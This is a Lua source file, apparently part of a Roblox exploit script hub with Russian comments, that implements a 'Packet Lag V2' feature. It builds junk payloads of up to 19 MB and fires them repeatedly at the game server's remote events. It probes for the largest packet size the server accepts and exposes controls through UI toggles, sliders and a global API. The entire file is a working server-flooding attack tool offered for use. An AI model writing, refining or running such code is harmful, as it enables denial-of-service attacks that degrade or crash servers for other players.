-- =========================================================================
do
    local lagActive = false
    local lagSizeMB = 1.5
    local lagDelay = 0.15
    local lagType = "Resonance"
    local lagCustom = "0"
    local lagNotifs = false

    local cachedData = "0"
    local cacheBuilt = false
    local lagPacketCount = 0
    local lagLoopTask = nil

    -- все 256 байтов одним паттерном
    local allSymbols = ""
    for i = 0, 255 do allSymbols = allSymbols .. string.char(i) end

    local Patterns = {
        Resonance                = "0",
        ["The Worst Premium Free"] = "FLOPPA LOVES YOU ",
        ["The Worst Private"]    = "Bliz_T HUB | FLOPPA LOVES YOU ",
        ["HammaM Root"]          = "MISHA LUV PDD❤️❤️❤️",
        ["HammaM Rat"]           = "🐀🐛",
        ["Zero Bits"]            = "\0",
        ["Max Power"]            = allSymbols,
    }

    local function lagLog(kind, msg, details)
        local t = os.date("%H:%M:%S")
        print(string.format("[LAG-%s] [%s] %s", kind, t, msg))
        if details then print("   └─ " .. details) end
    end

    local function getPattern()
        if lagType == "Custom" then
            return (lagCustom ~= nil and lagCustom ~= "") and lagCustom or "0"
        end
        return Patterns[lagType] or "0"
    end

    -- строим кэш один раз, пока не сменили тип/размер
    local function rebuildCache()
        local pattern = getPattern()
        local bytes = math.floor(lagSizeMB * 1024 * 1024)
        if bytes <= 0 then
            cachedData = pattern:sub(1, 1)
        else
            local plen = #pattern
            if plen == 0 then pattern = "0" plen = 1 end
            local reps = math.ceil(bytes / plen)
            cachedData = string.rep(pattern, reps):sub(1, bytes)
        end
        cacheBuilt = true
    end

    -- ExtendGrabLine главный, SetNetworkOwner фоллбэк; RemoteFunction тоже умеем
    local function getLagRemote()
        local GrabEvents = RS:FindFirstChild("GrabEvents")
        if not GrabEvents then return nil end
        return GrabEvents:FindFirstChild("ExtendGrabLine") or GrabEvents:FindFirstChild("SetNetworkOwner")
    end

    local function pushRemote(remote, data)
        if remote.ClassName == "RemoteFunction" then
            remote:InvokeServer(data)
        else
            remote:FireServer(data)
        end
    end

    -- ищем потолок размера, если сервер отверг пакет
    local function probeLimit(remote)
        local maxSize = 1
        local step = 0.25
        while maxSize > 0.01 do
            local testSize = math.floor(maxSize * 1024 * 1024)
            local testData = string.rep("0", testSize)
            local ok = pcall(pushRemote, remote, testData)
            if ok then
                local mb = math.floor(testSize / (1024 * 1024) * 100) / 100
                lagLog("INFO", "Limit found", mb .. " MB")
                notify("Limit Found", "Max size: " .. mb .. " MB", 4)
                break
            end
            maxSize = maxSize - step
            task.wait(0.1)
        end
    end

    local function sendLagPacket()
        if not cacheBuilt then rebuildCache() end
        local remote = getLagRemote()
        if not remote then
            lagLog("ERROR", "No target remote", "GrabEvents missing")
            return false
        end

        local t0 = tick()
        local ok, err = pcall(pushRemote, remote, cachedData)
        if not ok then
            lagLog("ERROR", "Send failed", tostring(err))
            probeLimit(remote)
            return false
        end

        lagPacketCount = lagPacketCount + 1
        local elapsed = tick() - t0
        if lagNotifs then
            notify("Packet Sent", string.format("%.2f MB | #%d | %.2fs", lagSizeMB, lagPacketCount, elapsed), 1)
        end
        return true
    end

    -- единый цикл, живёт всё время; при выключенном тугле просто спит
    lagLoopTask = task.spawn(function()
        while true do
            if lagActive then
                local t0 = tick()
                pcall(sendLagPacket)
                local waitTime = math.max(0.01, lagDelay - (tick() - t0))
                task.wait(waitTime)
            else
                task.wait(0.1)
            end
        end
    end)

    -- ===== UI =====
    local function setPacketLag(v)
        lagActive = v
        if v and not cacheBuilt then rebuildCache() end
    end

    Elm.Sect.PacketLag:AddToggle({
        Name = "Lag Active",
        Default = false,
        Flag = "PacketLagV2Active",
        Callback = setPacketLag
    })

    _G.MellstroyTogglePackets = function()
        setPacketLag(not lagActive)
        notify("Packet Lag V2", lagActive and "Enabled" or "Disabled", 2)
    end

    Elm.Sect.PacketLag:AddToggle({
        Name = "Lag Notifications",
        Default = false,
        Flag = "PacketLagV2Notifs",
        Callback = function(v) lagNotifs = v end
    })

    Elm.Sect.PacketLag:AddButton({
        Name = "Single Packet",
        Callback = function() pcall(sendLagPacket) end
    })

    local lagTypes = { "Resonance", "The Worst Premium Free", "The Worst Private", "HammaM Root", "HammaM Rat", "Zero Bits", "Max Power", "Custom" }

    Elm.Sect.PacketLag:AddDropdown({
        Name = "Lag Type",
        Options = lagTypes,
        Default = "Resonance",
        Callback = function(v)
            lagType = v
            cacheBuilt = false
        end
    })

    Elm.Sect.PacketLag:AddTextbox({
        Name = "Custom Pattern",
        Default = "0",
        TextDisappear = false,
        Callback = function(v)
            lagCustom = tostring(v or "0")
            if lagType == "Custom" then cacheBuilt = false end
        end
    })

    Elm.Sect.PacketLag:AddSlider({
        Name = "MB Size",
        Default = 1.5,
        Min = 0.01,
        Max = 19,
        Increment = 0.01,
        ValueName = "MB",
        Flag = "PacketLagV2Size",
        Callback = function(v)
            lagSizeMB = v
            cacheBuilt = false
        end
    })

    Elm.Sect.PacketLag:AddSlider({
        Name = "Lag Delay",
        Default = 0.15,
        Min = 0.01,
        Max = 10,
        Increment = 0.01,
        ValueName = "sec",
        Flag = "PacketLagV2Delay",
        Callback = function(v) lagDelay = v end
    })

    _G.PacketLagAPI = {
        Send     = function() return sendLagPacket() end,
        SetType  = function(t) lagType = t; cacheBuilt = false end,
        SetSize  = function(mb) lagSizeMB = mb; cacheBuilt = false end,
        SetDelay = function(d) lagDelay = d end,
        Start    = function() lagActive = true end,
        Stop     = function() lagActive = false end,
    }

    lagLog("INFO", "Packet Lag V2 loaded", "7 presets + custom, _G.PacketLagAPI")
end

